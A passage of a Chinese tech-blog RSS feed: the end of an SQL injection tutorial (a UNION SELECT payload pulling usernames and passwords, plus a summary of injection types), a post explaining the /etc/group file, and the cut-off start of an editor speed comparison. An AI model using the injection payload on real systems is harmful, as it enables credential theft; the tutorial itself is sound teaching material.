			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
-1 UNION SELECT 1,2,username,password FROM table&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c32b1409307383-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c32b1409307383-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;UNION &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;password &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;FROM &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;table&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0006 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h2 id=&quot;小结一下&quot;&gt;小结一下&lt;/h2&gt;
&lt;p&gt;SQL 注入大概有5种，还有两种分别是 Stacked_queries(基于堆栈)和 Time-based blind(时间延迟)，堆栈就是多语句查询，用 ‘;’ 把语句隔开，和 union 一样；时间延迟就是利用 sleep() 函数让数据库延迟执行，偷数据的速度很慢。(还有一个第六种，内联注入，但和前面涉及的内容有所重叠，就不单独来讨论了)&lt;/p&gt;

&lt;/div&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109784&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109784votetotal&quot;&gt;2&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109784&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 2 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt; 1 评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Tue, 10 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-10-109784-0a3ccbdc7.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-10-109784-0a3ccbdc7.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>每天一个 Linux 命令（31）: /etc/group 文件详解</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p class=&quot;p0&quot;&gt;  Linux /etc/group文件与/etc/passwd和/etc/shadow文件都是有关于系统管理员对用户和用户组管理时相关的文件。linux /etc/group文件是有关于系统管理员对用户和用户组管理的文件,linux用户组的所有信息都存放在/etc/group文件中。具有某种共同特征的用户集合起来就是用户组（Group）。用户组（Group）配置文件主要有 /etc/group和/etc/gshadow，其中/etc/gshadow是/etc/group的加密信息文件。&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    将用户分组是Linux系统中对用户进行管理及控制访问权限的一种手段。每个用户都属于某个用户组；一个组中可以有多个用户，一个用户也可以属于不 同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是用户所属的主组，也就是登录时所属的默认组，而其他组称为附加组。&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    用户组的所有信息都存放在/etc/group文件中。此文件的格式是由冒号(:)隔开若干个字段，这些字段具体如下：&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    组名:口令:组标识号:组内用户列表&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    具体解释：&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    &lt;strong&gt;组名：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    组名是用户组的名称，由字母或数字构成。与/etc/passwd中的登录名一样，组名不应重复。&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt; &lt;strong&gt;   口令：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    口令字段存放的是用户组加密后的口令字。一般Linux系统的用户组都没有口令，即这个字段一般为空，或者是*。&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;   &lt;strong&gt; 组标识号：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    组标识号与用户标识号类似，也是一个整数，被系统内部用来标识组。别称GID.&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    &lt;strong&gt;组内用户列表：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    是属于这个组的所有用户的列表，不同用户之间用逗号(,)分隔。这个用户组可能是用户的主组，也可能是附加组。&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;   &lt;strong&gt; 使用实例：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;    输出：&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a95551d30c234258778&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test6]# cat /etc/group
root:x:0:root,linuxsir
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a95551d30c234258778-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a95551d30c234258778-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a95551d30c234258778-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a95551d30c234258778-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a95551d30c234258778-5&quot;&gt;5&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a95551d30c234258778-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cat /etc/group&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a95551d30c234258778-2&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;linuxsir&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a95551d30c234258778-3&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;daemon&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a95551d30c234258778-4&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;daemon&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;daemon&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a95551d30c234258778-5&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bin&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0015 seconds] --&gt;

&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;    说明：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;    我们以root:x:0:root,linuxsir 为例： 用户组root，x是密码段，表示没有设置密码，GID是0,root用户组下包括root、linuxsir以及GID为0的其它用户。&lt;/p&gt;
&lt;h3&gt;本系列文章：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.jobbole.com/108531/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（1）：ls命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108805/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（2）：cd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108855/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（3）：pwd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108871/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（4）：mkdir命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108901/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（5）：rm 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108925/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（6）：rmdir 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108983/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（7）：mv命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108988/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（8）：cp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108989/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（9）：touch 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108990/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（10）：cat 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108991/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（11）：nl 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108992/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（12）：more 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（13）：less 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（14）：head 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108995/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（15）：tail 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109262/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（16）：which命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（17）：whereis 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（18）：locate 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109265/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（19）：find 命令概览&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108996/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（20）：find命令之exec&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108997/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（21）：find命令之xargs&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109268/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（22）：find 命令的参数详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109506/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（23）：Linux 目录结构&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109254/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（24）：Linux 文件类型与扩展名&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/105269&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（25）：Linux 文件属性详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109539&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（26）：用 SecureCRT 来上传和下载文件&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109614&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（27）：linux chmod 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109674/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（28）：tar 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109696/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（29）: chgrp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109750/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（30）: chown 命令&lt;/a&gt;&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109781&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109781votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109781&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Tue, 10 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-10-109781-c83beaa86.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-10-109781-c83beaa86.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>编辑器性能测试：Atom 、VS Code、Sublime Text</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;说到文本编辑器，我用 Sublime Text 已经差不多有三年了，也一直没遇到什么问题。在一两年前，我尝试过用 Atom，其活跃的社区 (GitHub！我超爱GitHub) 留给我很深刻的印象。Atom 的 UI 设计尤其吸引我，但我仍然坚持使用 Sublime Text 的原因就是因为性能问题：即使在 Atom 1.0 版本发布之后，Atom 还是太慢了。&lt;/p&gt;
&lt;p&gt;这几天，我在 Google 上搜索 “Sublime Text vs Atom 2016” 的文章，想看看 Atom 有没有什么显著的改善。然后我就看到了 Visual Studio Code。VS Code 也和 Atom 一样，是使用 Web 技术创建的，但有评论人说 VS Code 的速度要更快。所以我想做一个小测试，看看这几种编辑器的性能差异。&lt;/p&gt;
&lt;h2&gt;编辑器版本&lt;/h2&gt;
&lt;table width=&quot;342&quot;&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td width=&quot;151&quot;&gt;&lt;strong&gt;Editor&lt;/strong&gt;&lt;/td&gt;
&lt;td width=&quot;191&quot;&gt;&lt;strong&gt;Version&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td width=&quot;151&quot;&gt;&lt;a href=&quot;https://www.sublimetext.com/&quot;&gt;Sublime Text&lt;/a&gt;&lt;/td&gt;
&lt;td width=&quot;191&quot;&gt;3 beta, build 3126&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td width=&quot;151&quot;&gt;&lt;a href=&quot;https://atom.io/&quot;&gt;Atom&lt;/a&gt;&lt;/td&gt;
&lt;td width=&quot;191&quot;&gt;1.12.7&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td width=&quot;151&quot;&gt;&lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;Visual Studio Code&lt;/a&gt;&lt;/td&gt;
&lt;td width=&quot;191&quot;&gt;1.8.1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td width=&quot;151&quot;&gt;TextEdit&lt;/td&gt;
&lt;td width=&quot;191&quot;&gt;1.12 (329)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;方法&lt;/h2&gt;
&lt;p&gt;用于测试硬件：MacBook Pro 2016 13-inch 带 Touch Bar， (2.9 GHz Intel Core i5 CPU, 8GB 2133 MHz LPDDR3 RAM, 运行macOS Sierra 10.12.2)。所有可见的程序都关闭了。使用 macOS 自带的TextEdit 作为参照。&lt;/p&gt;
&lt;h3&gt;Launch Time 启动时间&lt;/h3&gt;
&lt;p&gt;每种编辑器都是从 Dock 中以点击图标的方式启动的。我记录了从点击图标到第一个窗口完全加载的这个过程的时长。&lt;/p&gt;
&lt;h3&gt;Window Open Time 窗口打开的时间&lt;/h3&gt;
&lt;p&gt;首先启动每种编辑器，随后关闭所有窗口。我记录了从 Dock 菜单（或其他等价菜单）点击“新窗口”到第一个窗口完全加载的时长。&lt;/p&gt;
&lt;h3&gt;Files Open Time 打开文件的时间&lt;/h3&gt;
&lt;p&gt;首先启动每种编辑器，打开一个窗口。将一个文件从 Finder 拖拽到编辑器的窗口中。我记录了从释放文件到文件完全加载的时长。&lt;/p&gt;
&lt;h3&gt;Files Generating 文件生成&lt;/h3&gt;
&lt;p&gt;使用下面这段 Python 脚本分别生成包含 1万行、100万行、1 百万行和 1 千万行文字的四个文件，文件大小分别是 370KB、3.7MB、37MB 和 370MB。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587ad2993b869237519953&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-mixed-highlight&quot; title=&quot;含多种语言&quot;&gt;&lt;/span&gt;&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Python&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
